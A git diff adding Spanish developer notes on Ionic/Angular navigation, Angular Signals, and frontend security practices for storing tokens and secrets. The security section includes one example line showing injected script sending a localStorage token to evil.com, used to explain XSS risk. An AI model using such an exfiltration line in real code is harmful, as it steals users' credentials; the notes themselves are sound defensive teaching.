@@ -865,3 +865,309 @@ tsconfig.server.json
 
 **Con SSR**
 - Servidor ejecuta Angular → genera HTML → envía HTML ya renderizado → navegador hidrata
+
+# Notas
+## Formas de navegar en Ionic + Angular
+![alt text](image.png)
+
+La regla de oro resumida en una línea: **si estás en Ionic, usa siempre `NavController` en TypeScript e `IonRouterLink` en templates** — las versiones de Angular puro funcionan, pero pierdes todas las animaciones nativas de iOS y Android.
+
+## Uso de Signal en versiones nueva de angular
+### ¿Qué es un Signal?
+
+Un Signal es un **contenedor reactivo de un valor**. Angular sabe exactamente cuándo cambia y actualiza solo las partes del DOM que dependen de él.
+
+```typescript
+// Variable normal
+nombre = 'Pikachu';
+
+// Signal
+nombre = signal('Pikachu');
+
+// Leer el valor → se llama como función
+console.log(this.nombre()); // 'Pikachu'
+
+// Escribir
+this.nombre.set('Charmander');
+
+// Actualizar basado en el valor anterior
+this.nombre.update(v => v + '!');
+```
+
+---
+
+### ¿Por qué Angular 17+ ya no renderiza variables normales?
+
+Tiene que ver con el **Change Detection** — el mecanismo que decide cuándo actualizar el DOM.
+
+### Antes (Zone.js)
+Angular usaba `Zone.js`, una librería que **parcheaba** todos los eventos del navegador (clicks, timers, HTTP...) para detectar cambios automáticamente. Funcionaba, pero era costoso — revisaba **todo el árbol de componentes** aunque solo cambiara una cosa.
+
+```typescript
+// Antes esto funcionaba porque Zone.js detectaba el cambio
+nombre = 'Pikachu';
+
+onClick() {
+  this.nombre = 'Charmander'; // Zone.js lo detectaba y re-renderizaba
+}
+```
+
+### Ahora (Signals + `OnPush` por defecto)
+Los nuevos proyectos Angular crean componentes con `changeDetection: ChangeDetectionStrategy.OnPush` implícito, o directamente sin Zone.js. Sin Zone.js, Angular **no monitorea variables normales** — solo sabe que algo cambió si usas un Signal.
+
+```typescript
+// Esto YA NO re-renderiza en componentes modernos
+nombre = 'Pikachu';
+onClick() {
+  this.nombre = 'Charmander'; // Angular no se entera
+}
+
+// Esto SÍ re-renderiza siempre
+nombre = signal('Pikachu');
+onClick() {
+  this.nombre.set('Charmander'); // Angular lo detecta al instante
+}
+```
+
+---
+
+### Los 3 tipos de Signals
+
+```typescript
+// 1. signal() — valor simple con escritura
+count = signal(0);
+this.count.set(5);
+this.count.update(v => v + 1);
+
+// 2. computed() — derivado de otros signals, solo lectura
+double = computed(() => this.count() * 2);
+// se recalcula automáticamente cuando count cambia
+
+// 3. effect() — ejecuta código cuando un signal cambia
+effect(() => {
+  console.log('count cambió a:', this.count());
+});
+```
+
+---
+
+### ¿Cuándo SÍ usar Signals?
+
+```typescript
+// Estado local del componente
+loading = signal(false);
+pokemons = signal<Pokemon[]>([]);
+selectedId = signal<number | null>(null);
+
+// Valores derivados
+totalPages = computed(() => Math.ceil(this.total() / this.pageSize()));
+isEmpty = computed(() => this.pokemons().length === 0);
+
+// Reaccionar a cambios (efectos secundarios)
+effect(() => {
+  localStorage.setItem('page', this.currentPage().toString());
+});
+```
+
+---
+
+### ¿Cuándo NO usar Signals?
+
+```typescript
+// Constantes que nunca cambian → variable normal
+readonly API_URL = 'https://pokeapi.co/api/v2';
+readonly PAGE_SIZE = 20;
+
+// Dependencias inyectadas → inject()
+private svc = inject(PokemonService);
+
+// Valores de @Input que vienen del padre → input()
+// (Angular 17+ tiene su propio input signal)
+name = input<string>();         // signal de solo lectura
+name = input.required<string>();
+
+// Streams de HTTP → Observable (no signal)
+// porque HTTP es async y RxJS lo maneja mejor
+getPokemons(): Observable<Pokemon[]> {
+  return this.http.get<Pokemon[]>(this.API_URL);
+}
+```
+
+---
+
+### Signals vs Variables normales vs Observables
+
+| | Variable normal | Signal | Observable |
+|---|---|---|---|
+| Reactivo | ✗ | ✓ | ✓ |
+| Renderiza automático | Solo con Zone.js | Siempre | Con `async` pipe |
+| Valor síncrono | ✓ | ✓ | ✗ |
+| Para HTTP/streams | ✓ | ✗ | ✓ |
+| Computed/derivados | Manual | `computed()` | `map()` |
+| Efectos secundarios | Manual | `effect()` | `subscribe()` |
+| Complejidad | Baja | Baja | Alta |
+
+---
+
+### Resumen en una línea
+
+> Usa **Signal** para todo estado local que el template necesite mostrar. Usa **Observable** para HTTP y streams async. Usa **variable normal** solo para constantes y dependencias.
+
+# Consejos de Seguridad
+
+## Dónde guardar Tokens / Keys
+
+### ❌ `localStorage` — el más inseguro para tokens
+```javascript
+// NUNCA guardes tokens de autenticación aquí
+localStorage.setItem('token', 'eyJhbGc...');
+```
+El problema es **XSS (Cross-Site Scripting)** — cualquier script malicioso inyectado en tu app puede leer todo el `localStorage` con una línea:
+```javascript
+fetch('https://evil.com?token=' + localStorage.getItem('token'));
+```
+
+---
+
+## ¿Entonces dónde guardar cada cosa?
+
+### Tokens de autenticación (JWT, OAuth)
+```
+La opción más segura es memoria RAM (variable en el servicio)
+```
+```typescript
+// ✅ Mejor opción — solo vive mientras la app está abierta
+@Injectable({ providedIn: 'root' })
+export class AuthService {
+  private token = signal<string | null>(null); // en memoria, no persiste
+
+  setToken(t: string) { this.token.set(t); }
+  getToken() { return this.token(); }
+}
+```
+El problema: se pierde al recargar. La solución real es usar **HttpOnly Cookies** — las maneja el servidor y JavaScript **nunca puede leerlas**.
+
+---
+
+## Tabla de dónde guardar cada cosa
+
+| Dato | localStorage | SessionStorage | Memoria (signal) | HttpOnly Cookie | Capacitor Preferences | Keychain/Keystore |
+|---|---|---|---|---|---|---|
+| JWT / token auth | ❌ | ⚠️ | ✅ mejor | ✅ ideal web | ⚠️ | ✅ ideal móvil |
+| Refresh token | ❌ | ❌ | ❌ | ✅ | ❌ | ✅ |
+| Preferencias UI | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
+| Datos de sesión ligeros | ⚠️ | ✅ | ✅ | ❌ | ✅ | ❌ |
+| Datos sensibles (salud, finanzas) | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
+| API keys públicas | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
+| API keys privadas / secretos | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ nunca en cliente |
+
+---
+
+## En Ionic/Capacitor para móvil
+
+```typescript
+// ✅ Para tokens en móvil — usa Keychain (iOS) / Keystore (Android)
+// plugin: @capacitor/secure-storage o capacitor-secure-storage-plugin
+
+import { SecureStorage } from 'capacitor-secure-storage-plugin';
+
+// guardar
+await SecureStorage.set({ key: 'auth_token', value: token });
+
+// leer
+const { value } = await SecureStorage.get({ key: 'auth_token' });
+```
+
+`Capacitor Preferences` **no está cifrado** — es como `localStorage` pero nativo. Para tokens usa siempre el almacenamiento seguro del sistema operativo.
+
+---
+
+## Archivo `.env` — qué va ahí y qué no
+
+```bash
+# ✅ SÍ va en .env — configuración de entorno, NO secretos del cliente
+NG_APP_API_URL=https://api.miapp.com
+NG_APP_POKEAPI_URL=https://pokeapi.co/api/v2
+NG_APP_VERSION=1.0.0
+NG_APP_GOOGLE_MAPS_KEY=AIza...  # ⚠️ solo si es pública y restringida por dominio
+
+# ❌ NUNCA en .env del frontend
+NG_APP_DB_PASSWORD=supersecret      # ❌
+NG_APP_STRIPE_SECRET_KEY=sk_live_.. # ❌
+NG_APP_JWT_SECRET=mi_secreto        # ❌
+```
+
+> La regla de oro: **todo lo que esté en el `.env` del frontend se puede ver en el bundle compilado**. El usuario puede abrirlo con las DevTools. No es un lugar seguro para secretos reales.
+
+Los secretos reales van en el `.env` del **backend**, nunca del frontend.
+
+---
+
+## Otras recomendaciones de seguridad en desarrollo
+
+### 1. HTTPS siempre
+```typescript
+// En producción forzar HTTPS desde el servidor
+// En Angular, nunca hacer peticiones HTTP en prod
+const API = environment.production
+  ? 'https://api.miapp.com'   // ✅
+  : 'http://localhost:3000';  // solo local
+```
+
+### 2. No loguear datos sensibles
+```typescript
+// ❌ Jamás en producción
+console.log('Token:', this.token());
+console.log('Usuario:', JSON.stringify(user));
+
+// ✅ Solo en desarrollo
+if (!environment.production) {
+  console.log('debug:', data);
+}
+```
+
+### 3. Interceptor para agregar el token
+```typescript
+// ✅ El token viaja en el header, no en la URL
+export const authInterceptor: HttpInterceptorFn = (req, next) => {
+  const token = inject(AuthService).getToken();
+  if (!token) return next(req);
+
+  return next(req.clone({
+    setHeaders: { Authorization: `Bearer ${token}` }
+  }));
+};
+// ❌ Nunca así
+this.http.get(`/api/data?token=${token}`) // el token queda en logs del servidor
+```
+
+### 4. `.gitignore` siempre actualizado
+```bash
+# .gitignore
+.env
+.env.local
+.env.production
+/android/app/google-services.json   # Firebase
+/ios/App/App/GoogleService-Info.plist
+```
+
+### 5. Validar siempre en el backend
+```typescript
+// El frontend valida para UX, el backend valida para seguridad
+// Un usuario puede saltarse cualquier validación del frontend con DevTools
+```
+
+---
+
+## Resumen de reglas
+
+| Regla | Por qué |
+|---|---|
+| Tokens auth → memoria o HttpOnly Cookie | XSS no puede robarlos |
+| Secretos → solo en backend | El bundle JS es público |
+| `.env` frontend → solo config, no secretos | Se incluye en el bundle |
+| Datos sensibles móvil → Keychain/Keystore | Cifrado por el SO |
+| HTTPS en producción siempre | Evita man-in-the-middle |
+| No `console.log` en producción | Los logs son visibles |
+| Validar siempre en backend | El frontend es salteable |
+| `.gitignore` el `.env` | Nunca subir secretos al repo |
